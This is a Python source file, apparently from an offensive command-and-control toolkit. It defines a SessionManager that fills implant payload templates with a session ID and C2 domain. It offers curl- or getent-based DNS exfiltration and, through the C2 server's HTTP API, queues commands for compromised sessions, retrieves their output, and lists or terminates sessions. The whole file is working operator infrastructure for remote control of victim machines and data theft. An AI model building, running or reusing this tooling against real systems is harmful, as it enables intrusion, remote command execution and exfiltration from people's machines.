"""Session manager for C2 server interaction."""

from pathlib import Path
from typing import Optional

import click
import requests

from .config import get_config


class SessionManager:
    """Manages C2 sessions and payloads via HTTP API to C2 server."""

    def __init__(self, c2_domain: str = None, c2_server: str = None):
        """
        Initialize session manager.

        Args:
            c2_domain: C2 DNS domain (from config if not specified)
            c2_server: C2 HTTP server URL (from config if not specified)
        """
        config = get_config()
        self.c2_domain = c2_domain or config.domain
        self.c2_server = c2_server or config.c2_server_url
        self.sessions = {}

    def create_payload(
        self,
        session_id: str,
        output_file: str = None,
        use_curl_for_exfil: bool = False,
    ) -> str:
        """
        Create a payload with the specified session ID.

        Args:
            session_id: Unique session identifier
            output_file: Optional file to write payload to
            use_curl_for_exfil: Use curl instead of getent for exfiltration

        Returns:
            Payload content string, or output file path if output_file specified
        """
        # Read the template from c2/payload/client.py
        template_path = Path(__file__).parent.parent / "payload" / "client.py"
        with open(template_path, "r") as f:
            payload_content = f.read()

        # Replace placeholders with actual values
        payload_content = payload_content.replace(
            "__SESSION_ID_PLACEHOLDER__", session_id
        )
        payload_content = payload_content.replace(
            "__C2_DOMAIN_PLACEHOLDER__", self.c2_domain
        )

        # Set exfiltration method if requested
        if use_curl_for_exfil:
            payload_content = payload_content.replace(
                "os.environ.get('USE_CURL_FOR_EXFIL', 'false').lower() == 'true'",
                "True  # Enabled: use curl to avoid getent caching",
            )

        if output_file:
            with open(output_file, "w") as f:
                f.write(payload_content)
            return output_file

        return payload_content

    def queue_command(self, session_id: str, command: str) -> bool:
        """
        Send a command to the C2 server for a specific session.

        Args:
            session_id: Target session ID
            command: Command to execute

        Returns:
            True if command was queued successfully
        """
        try:
            response = requests.post(
                f"{self.c2_server}/api/command",
                json={"command": command, "session": session_id},
                timeout=5,
            )
            return response.status_code == 200
        except Exception as e:
            click.echo(f"[!] Error sending command: {e}", err=True)
            return False

    def get_output(self, session_id: str, since_id: int = 0) -> list:
        """
        Retrieve output for a specific session.

        Args:
            session_id: Target session ID
            since_id: Only return outputs after this ID

        Returns:
            List of output dictionaries
        """
        try:
            response = requests.get(
                f"{self.c2_server}/api/output",
                params={"session": session_id, "since": since_id},
                timeout=5,
            )
            if response.status_code == 200:
                return response.json().get("outputs", [])
        except Exception as e:
            click.echo(f"[!] Error getting output: {e}", err=True)
        return []

    def terminate_session(self, session_id: str) -> bool:
        """
        Terminate a session on the C2 server.

        Args:
            session_id: Session to terminate

        Returns:
            True if terminated successfully
        """
        try:
            response = requests.post(
                f"{self.c2_server}/api/terminate",
                json={"session": session_id},
                timeout=5,
            )
            return response.status_code == 200
        except Exception as e:
            click.echo(f"[!] Error terminating session: {e}", err=True)
            return False

    def list_sessions(self) -> list:
        """
        List active sessions on the C2 server.

        Returns:
            List of session dicts with id, last_seen, pending_commands, chunk_count
        """
        try:
            response = requests.get(
                f"{self.c2_server}/api/sessions",
                timeout=5,
            )
            if response.status_code == 200:
                return response.json().get("sessions", [])
        except Exception as e:
            click.echo(f"[!] Error listing sessions: {e}", err=True)
        return []

    def get_debug_info(self) -> dict:
        """
        Get debug diagnostics from the C2 server.

        Returns:
            Dict with recent_dns_queries, active_sessions, output_buffer,
            server_uptime
        """
        try:
            response = requests.get(
                f"{self.c2_server}/api/debug",
                timeout=5,
            )
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            click.echo(f"[!] Error getting debug info: {e}", err=True)
        return {}

    def check_connection(self) -> bool:
        """Check if we can connect to the C2 server."""
        try:
            response = requests.get(
                f"{self.c2_server}/api/output",
                params={"session": "healthcheck"},
                timeout=5,
            )
            return response.status_code == 200
        except:
            return False
